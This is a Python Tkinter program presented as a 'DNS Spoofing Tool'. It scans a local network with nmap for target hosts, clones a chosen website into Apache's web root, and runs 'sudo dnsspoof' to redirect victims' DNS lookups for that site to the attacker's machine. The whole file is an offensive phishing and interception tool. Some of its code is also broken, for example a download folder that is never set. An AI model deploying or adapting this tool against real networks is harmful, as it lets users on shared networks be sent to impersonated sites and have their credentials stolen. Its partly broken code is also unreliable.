#!/usr/bin/env python3

import os
import subprocess
import tkinter as tk
from tkinter import filedialog, messagebox, simpledialog
import netifaces
import nmap
import requests
from bs4 import BeautifulSoup
import shutil
import re

class Tooltip:
    def __init__(self, widget, text):
        self.widget = widget
        self.text = text
        self.widget.bind("<Enter>", self.enter)
        self.widget.bind("<Leave>", self.leave)
        self.tooltip = None

    def enter(self, event=None):
        self.tooltip = tk.Toplevel(self.widget)
        x, y, _, _ = self.widget.bbox("insert")
        x_root, y_root = self.widget.winfo_rootx() + x + 25, self.widget.winfo_rooty() + y + 20
        self.tooltip.wm_overrideredirect(True)
        self.tooltip.wm_geometry(f"+{x_root}+{y_root}")
        label = tk.Label(self.tooltip, text=self.text, background="#ffffe0", relief="solid", borderwidth=1)
        label.pack(ipadx=1)

    def leave(self, event=None):
        if self.tooltip:
            self.tooltip.destroy()

class DNS_Spoofing_Tool:
    def __init__(self, root):
        self.root = root
        self.root.title("DNS Spoofing Tool")

        # Label and entry for Parrot Linux IP
        self.parrot_ip_label = tk.Label(root, text="Your IP:")
        self.parrot_ip_label.grid(row=0, column=0, padx=10, pady=5)
        self.parrot_ip_entry = tk.Entry(root)
        self.parrot_ip_entry.grid(row=0, column=1, padx=10, pady=5)
        Tooltip(self.parrot_ip_entry, "Your Parrot Linux IP address.")

        # Label and entry for target URL
        self.target_url_label = tk.Label(root, text="Target URL:")
        self.target_url_label.grid(row=1, column=0, padx=10, pady=5)
        self.target_url_entry = tk.Entry(root)
        self.target_url_entry.grid(row=1, column=1, padx=10, pady=5)
        Tooltip(self.target_url_entry, "Enter the URL of the website you want to clone.")

        # Button to scan for available target IPs
        self.scan_button = tk.Button(root, text="Scan for Target IPs", command=self.scan_ips)
        self.scan_button.grid(row=0, column=2, padx=10, pady=5)
        Tooltip(self.scan_button, "Scan for available target IP addresses in the network.")

        # Dropdown for network interface
        self.interface_label = tk.Label(root, text="Network Interface:")
        self.interface_label.grid(row=2, column=0, padx=10, pady=5)
        self.interfaces = netifaces.interfaces()
        self.interface_var = tk.StringVar(root)
        self.interface_var.set(self.interfaces[0])  # Set default value
        self.interface_dropdown = tk.OptionMenu(root, self.interface_var, *self.interfaces)
        self.interface_dropdown.grid(row=2, column=1, padx=10, pady=5)
        Tooltip(self.interface_dropdown, "Select the network interface to use for DNS spoofing.")

        # Label to display available target IPs
        self.target_ips_label = tk.Label(root, text="Available Target IPs:")
        self.target_ips_label.grid(row=3, column=0, padx=10, pady=5)
        self.target_ips_text = tk.Text(root, height=5, width=50)
        self.target_ips_text.grid(row=3, column=1, columnspan=2, padx=10, pady=5)
        Tooltip(self.target_ips_text, "List of available target IP addresses found in the network.")

        # Button to start DNS spoofing
        self.start_button = tk.Button(root, text="Start DNS Spoofing", command=self.start_dns_spoofing)
        self.start_button.grid(row=5, column=0, columnspan=2, padx=10, pady=5)
        Tooltip(self.start_button, "Start DNS spoofing with the specified configuration.")

        # Get and display Parrot Linux IP
        self.parrot_ip_entry.insert(0, self.get_parrot_ip())

    def get_parrot_ip(self):
        # Get IP address of the Parrot Linux machine
        for interface in netifaces.interfaces():
            if interface != "lo":
                return netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']

    def scan_ips(self):
        try:
            # Perform a network scan to identify other devices on the network
            ip_range = self.get_ip_range()
            nm = nmap.PortScanner()
            nm.scan(hosts=ip_range, arguments='-sn')

            # Display the results in the text field
            self.target_ips_text.delete(1.0, tk.END)  # Clear previous results
            for host in nm.all_hosts():
                manufacturer = nm[host]['vendor'].get('mac') if 'vendor' in nm[host] else "Unknown"
                self.target_ips_text.insert(tk.END, f"IP: {host}, Manufacturer: {manufacturer}\n")
        except Exception as e:
            messagebox.showerror("Error", f"An error occurred while scanning IPs: {str(e)}")

    def get_ip_range(self):
        # Retrieve IP range from user input
        ip_range_input = simpledialog.askstring("IP Range", "Enter IP range (e.g., 192.168.0.0/24):")
        if ip_range_input:
            return ip_range_input
        else:
            raise ValueError("Invalid IP range")

    def download_website(self, url, folder_path):
        # Download website contents and save locally
        response = requests.get(url)
        soup = BeautifulSoup(response.content, 'html.parser')
        
        # Create folder if not exists
        if not os.path.exists(folder_path):
            os.makedirs(folder_path)

        # Save HTML file
        with open(os.path.join(folder_path, 'index.html'), 'w') as file:
            file.write(soup.prettify())

        # Download and save CSS files
        for link in soup.find_all('link', href=True):
            css_url = link['href']
            if css_url.startswith(('http://', 'https://')):
                css_response = requests.get(css_url)
                css_file_name = re.sub(r'\W+', '', os.path.basename(css_url))  # Remove non-alphanumeric characters
                with open(os.path.join(folder_path, css_file_name), 'wb') as css_file:
                    css_file.write(css_response.content)

        # Download and save JavaScript files
        for script in soup.find_all('script', src=True):
            js_url = script['src']
            if js_url.startswith(('http://', 'https://')):
                js_response = requests.get(js_url)
                js_file_name = re.sub(r'\W+', '', os.path.basename(js_url))  # Remove non-alphanumeric characters
                with open(os.path.join(folder_path, js_file_name), 'wb') as js_file:
                    js_file.write(js_response.content)

        messagebox.showinfo("Success", f"Website downloaded successfully to {folder_path}")

    def select_folder(self):
        # Opens file dialog to select folder for downloaded website files
        self.downloaded_folder = filedialog.askdirectory()

    def start_dns_spoofing(self):
        try:
            # Get Parrot Linux IP, target URL, and selected network interface
            parrot_ip = self.parrot_ip_entry.get()
            target_url = self.target_url_entry.get()
            selected_interface = self.interface_var.get()

            # Download website contents
            if self.downloaded_folder:
                self.download_website(target_url, self.downloaded_folder)

                # Update hosts.txt with Parrot Linux IP and target URL
                hosts_file_path = "/tmp/hosts.txt"
                with open(hosts_file_path, "w") as f:
                    f.write(f"{parrot_ip} {target_url}")

                # Move downloaded website files to Apache's root directory
                shutil.move(self.downloaded_folder, "/var/www/html/")

                # Start DNS spoofing with selected network interface
                subprocess.Popen(["sudo", "dnsspoof", "-i", selected_interface, "-f", hosts_file_path])
                messagebox.showinfo("Success", "DNS Spoofing started successfully!")
            else:
                messagebox.showerror("Error", "Please select a folder for downloaded website files.")
        except Exception as e:
            messagebox.showerror("Error", f"An error occurred: {str(e)}")

if __name__ == "__main__":
    root = tk.Tk()
    dns_spoofing_tool = DNS_Spoofing_Tool(root)
    root.mainloop()
